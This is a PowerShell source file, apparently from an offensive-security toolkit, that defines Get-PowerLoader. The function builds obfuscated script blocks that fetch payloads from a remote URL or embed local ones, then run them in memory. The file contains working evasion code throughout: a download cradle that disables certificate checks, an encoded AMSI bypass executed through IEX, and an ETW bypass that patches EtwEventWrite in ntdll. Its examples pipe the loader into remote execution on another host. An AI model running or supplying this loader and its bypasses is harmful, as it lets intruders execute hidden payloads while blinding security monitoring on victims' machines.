function Get-PowerLoader {
<#
.SYNOPSIS
    Build script block which safely loads PowerShell or .NET assembly.

    Author: Timothee MENOCHET (@_tmenochet)

.DESCRIPTION
    Get-PowerLoader returns PowerShell script block embedding download cradle or local file as payload.

.PARAMETER Type
    Specifies the payload type, defaults to PoSH.

.PARAMETER FilePath
    Specifies a local payload.

.PARAMETER FileUrl
    Specifies a remote payload.

.PARAMETER ArgumentList
    Specifies the payload arguments.

.PARAMETER Bypass
    Specifies the bypass techniques to include.

.EXAMPLE
    PS C:\> Get-PowerLoader -Type PoSh -FileUrl 'https://192.168.0.1/script.ps1' -ArgumentList 'Invoke-Sample','-Verbose' -Bypass AMSI

.EXAMPLE
    PS C:\> Get-PowerLoader -Type NetAsm -FilePath .\sharp.exe | Invoke-PowerExec -ComputerList 192.168.0.2
#>
    [CmdletBinding()]
    Param (
        [ValidateSet("PoSh","NetAsm")]
        [string]
        $Type = "PoSh",

        [ValidateScript({Test-Path $_ -PathType Leaf})]
        [string]
        $FilePath,

        [string]
        $FileUrl,

        [ValidateNotNullOrEmpty()]
        [string[]]
        $ArgumentList,

        [ValidateSet("AMSI","ETW")]
        [string[]]
        $Bypass
    )

    $srcCode = ${function:Get-DecodedBytes}.Ast.Extent.Text + [Environment]::NewLine
    if ($FilePath) {
        $bytes = [IO.File]::ReadAllBytes((Resolve-Path $FilePath))
        $bytes = $bytes | foreach {$_ -bxor 1}
        $encCode = Get-EncodedBytes($bytes)
        $srcCode += '$code = Get-DecodedBytes("' + $encCode + '") | foreach {$_ -bxor 1}' + [Environment]::NewLine
    }
    elseif ($FileUrl) {
        $srcCode += ${function:Invoke-DownloadCradle}.Ast.Extent.Text + [Environment]::NewLine
        $bytes = [Text.Encoding]::UTF8.GetBytes($FileUrl)
        $bytes = $bytes | foreach {$_ -bxor 1}
        $encUrl = Get-EncodedBytes($bytes)
        $srcCode += '$code = Invoke-DownloadCradle([Text.Encoding]::UTF8.GetString($(Get-DecodedBytes("' + $encUrl + '") | foreach {$_ -bxor 1})))' + [Environment]::NewLine
    }
    else {
        Write-Error "Either FilePath or FileUrl parameter must be specified" -ErrorAction Stop
    }

    if ($ArgumentList) {
        $args = $ArgumentList -join ','
        $bytes = [Text.Encoding]::UTF8.GetBytes($args)
        $bytes = $bytes | foreach {$_ -bxor 1}
        $encArgs = Get-EncodedBytes($bytes)
        $srcArgs = '$args = $([Text.Encoding]::UTF8.GetString($(Get-DecodedBytes("' + $encArgs + '") | foreach {$_ -bxor 1}))).Split('','')' + [Environment]::NewLine
    }
    else {
        $srcArgs = '$args = $null' + [Environment]::NewLine
    }

    $srcBypass = ''
    switch ($Bypass) {
        'AMSI' {
            $srcBypass += '$a = "H4sIAAAAAAAEAD2MsQrCMBQAv8UhoRVLdunQyToIYtUKIhLqa/uEpA+TPAilH2/r4Hhwd+zjKLRxmN/P0D9U4RyYl41qB3yNH0hlFR2DUQdNugMDxKoIPBjNOJAq5lKu5YXROplsRY9g2/w3XA7lgqlccE/Is1lqtNDKTB4HOoWXxSareH41/1pVwDdtA6SCgrWZYB8gmRrNzXusPTJsau0JqVuJ5/QFxk/YMsAAAAA="' + [Environment]::NewLine
            $srcBypass += 'IEX $([Text.Encoding]::UTF8.GetString($(Get-DecodedBytes($a) | foreach {$_ -bxor 1})))' + [Environment]::NewLine
        }
        'ETW' {
            $srcBypass += '& ' + ${function:Invoke-EtwBypass}.Ast.Body.Extent.Text + [Environment]::NewLine
        }
    }

    switch ($Type) {
        'PoSh' {
            $srcLoader = ${function:Invoke-PoshLoader}.Ast.Extent.Text + [Environment]::NewLine
            $srcLoader += 'Invoke-PoshLoader -Code $([Text.Encoding]::UTF8.GetString($code)) -ArgumentList $args'
        }
        'NetAsm' {
            $srcLoader = ${function:Invoke-NetLoader}.Ast.Extent.Text + [Environment]::NewLine
            $srcLoader += 'Invoke-NetLoader -Code $code -ArgumentList $args'
        }
    }

    $script = $srcCode + $srcArgs + $srcBypass + $srcLoader
    return [ScriptBlock]::Create($script)
}

function Local:Get-EncodedBytes {
    Param(
        [Parameter(Mandatory = $True)]
        [byte[]] $ByteArray
    )

    [IO.MemoryStream] $output = New-Object System.IO.MemoryStream
    $gzipStream = New-Object System.IO.Compression.GzipStream $output, ([IO.Compression.CompressionMode]::Compress)
    $gzipStream.Write($ByteArray, 0, $ByteArray.Length)
    $gzipStream.Close()
    $output.Close()
    $out = $output.ToArray()
    return [Convert]::ToBase64String($out)
}

function Local:Get-DecodedBytes {
    Param(
        [Parameter(Mandatory = $True)]
        [string] $EncBytes
    )

    $byteArray = [Convert]::FromBase64String($EncBytes)
    $input = New-Object System.IO.MemoryStream(,$byteArray)
    $output = New-Object System.IO.MemoryStream
    $gzipStream = New-Object System.IO.Compression.GzipStream $input, ([IO.Compression.CompressionMode]::Decompress)
    $gzipStream.CopyTo($output)
    $gzipStream.Close()
    $input.Close()
    return $output.ToArray()
}

function Local:Invoke-DownloadCradle {
    Param (
        [Parameter(Mandatory=$True)]
        [string] $URL
    )

    $code = $null
    try {
        [Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        $client = [Net.WebRequest]::Create($URL)
        $client.Proxy = [Net.WebRequest]::GetSystemWebProxy()
        $client.Proxy.Credentials = [Net.CredentialCache]::DefaultCredentials
        $response = $client.GetResponse()
        $respStream = $response.GetResponseStream()
        $buffer = New-Object byte[] $response.ContentLength
        $writeStream = New-Object System.IO.MemoryStream $response.ContentLength
        do {
            $bytesRead = $respStream.Read($buffer, 0, $buffer.Length)
            $writeStream.Write($buffer, 0, $bytesRead)
        }
        while ($bytesRead -gt 0)
        $code = New-Object byte[] $response.ContentLength
        [Array]::Copy($writeStream.GetBuffer(), $code, $response.ContentLength)
        $respStream.Close()
        $response.Close()
    }
    catch [Net.WebException] {
        Write-Error $_
    }
    return $code
}

function Local:Invoke-PoshLoader {
    Param (
        [Parameter(Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [string] $Code,

        [string[]] $ArgumentList
    )

    Invoke-Expression "$Code $($ArgumentList -join ' ')"
}

function Local:Invoke-NetLoader {
    Param (
        [Parameter(Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [byte[]] $Code,

        [string[]] $ArgumentList
    )
    $output = New-Object IO.StringWriter
    [Console]::SetOut($output)
    $assembly = [Reflection.Assembly]::Load([byte[]]$Code)
    $al = New-Object -TypeName System.Collections.ArrayList
    $al.add($ArgumentList) | Out-Null
    try {
        $assembly.EntryPoint.Invoke($null, $al.ToArray())
    }
    catch [Management.Automation.MethodInvocationException] {
        Write-Warning $_
    }
    finally {
        Write-Output $output.ToString()
    }
}

function Local:Invoke-EtwBypass {
    $win32 = @"
using System.Runtime.InteropServices;
using System;
public class Win32 {
[DllImport("kernel32")]
public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
[DllImport("kernel32")]
public static extern IntPtr LoadLibrary(string name);
[DllImport("kernel32")]
public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@
    Add-Type $win32
    $address = [Win32]::GetProcAddress([Win32]::LoadLibrary("ntdll.dll"), "EtwEventWrite")
    $a = 0
    $b = 0
    $h = New-Object Byte[] 1
    $h[0] = 0xc3
    [Win32]::VirtualProtect($address, [UInt32]$h.Length, 0x40, [Ref]$a) | Out-Null
    [System.Runtime.InteropServices.Marshal]::Copy($h, 0, $address, [UInt32]$h.Length)
    [Win32]::VirtualProtect($address, [UInt32]$h.Length, $a, [Ref]$b) | Out-Null
}